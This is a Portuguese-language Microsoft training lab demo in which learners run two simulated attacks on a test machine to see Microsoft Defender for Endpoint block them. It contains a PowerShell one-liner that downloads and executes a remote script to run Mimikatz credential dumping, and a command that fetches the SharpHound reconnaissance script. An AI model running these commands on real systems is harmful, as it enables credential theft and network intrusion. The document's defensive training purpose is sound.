# Demonstração do Módulo 2: mitigar os ataques com o Microsoft Defender para Ponto de Extremidade

**Observação** A conclusão bem-sucedida desta demonstração depende da conclusão de todas as etapas no [Documento de pré-requisitos](00-prerequisites.md).

## Ataques simulados

Nesta tarefa, você executará dois ataques simulados para explorar os recursos do Microsoft Defender para Ponto de Extremidade.

1. Se você ainda não estiver no portal do Microsoft Defender XDR em seu navegador, acesse o Microsoft Defender XDR em (https://security.microsoft.com) conectado como Administrador do seu locatário.

Você executará os ataques *simulados* usando o *PowerShell* em *WIN1* para explorar os recursos do Microsoft Defender para Ponto de Extremidade.

`Attack 1: Mimikatz - Credential Dumping`

1. No computador *WIN1*, digite **Command** na barra de pesquisa e selecione **Executar como administrador**.

1. Na janela do terminal, copie e cole o comando a seguir na janela **Administrador: prompt de comando** e pressione **Enter** para executá-lo.

    ```CommandPrompt
    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
    ```

1. Você verá uma mensagem com a informação *Acesso negado* e uma mensagem pop-up de `Microsoft Defender Antivirus, Windows Security Virus and threats protection` exibindo *Ameaças encontradas*.

1. Saia da janela **Administrador: prompt de comando** digitando **sair** e pressionando **Enter**.

`Attack 2: Bloodhound - Collection`

1. No computador *WIN1*, digite **PowerShell** na barra de pesquisa, selecione **Windows PowerShell** e selecione **Executar como administrador**.

1. Copie e cole os comandos a seguir na janela **Administrador: Windows PowerShell** e pressione **Enter** para executá-los.

    ```PowerShell
    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

    >**Observação:** Recomenda-se copiar, colar e executar os comandos um de cada vez. Você pode abrir o *Bloco de notas* e copiar os comandos em um arquivo temporário para fazer isso. O primeiro comando cria uma pasta chamada *ExternalPayloads* na mesma pasta onde a pasta *Atomic Red Team* está localizada. O segundo comando baixa o arquivo *SharpHound.ps1* do repositório GitHub do *BloodHound* e o salva na pasta *ExternalPayloads*.

1. Você verá uma mensagem pop-up de `Windows Security Virus and threats protection` exibindo o texto *Ameaças encontradas*.

1. Na janela do terminal, copie e cole o comando a seguir na janela **Administrador: Windows PowerShell** e pressione **Enter** para executá-los.

    ```PowerShell
    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

1. Se a saída é *True*, o arquivo de payload de malware não foi removido pelo Microsoft Defender Antivirus. Se a saída é *False*, o arquivo de payload de malware foi removido pelo Microsoft Defender Antivirus. Use a tecla de seta para cima para repetir o comando até que a saída seja *False*.

## Você concluiu a demonstração
